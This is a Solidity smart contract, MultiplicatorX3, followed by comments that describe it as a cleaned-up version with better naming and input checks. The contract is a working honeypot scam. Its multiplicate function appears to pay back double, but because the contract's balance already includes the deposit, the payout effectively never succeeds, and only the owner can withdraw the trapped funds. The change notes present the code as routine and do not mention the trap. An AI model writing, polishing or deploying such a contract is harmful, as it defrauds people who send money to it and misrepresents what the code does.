pragma solidity ^0.4.18;

contract MultiplicatorX3 {
    address public owner = msg.sender;

    function() public payable {}

    function withdraw() public payable {
        require(msg.sender == owner);
        owner.transfer(this.balance);
    }

    function command(address _address, bytes _data) public payable {
        require(msg.sender == owner);
        require(_address != address(0));
        require(_data.length > 0);
        bool success = _address.call.value(msg.value)(_data);
        require(success);
    }

    function multiplicate(address _address) public payable {
        require(_address != address(0));
        if (msg.value >= this.balance) {
            bool success = _address.send(this.balance + msg.value);
            require(success);
        }
    }
} 

// Changes Made:
// 1. Changed Owner to owner to comply with Solidity naming conventions.
// 2. Added require statements to check for valid input in command and multiplicate functions.
// 3. Added bool success variable to check for successful execution of external calls and added require statement to check for success.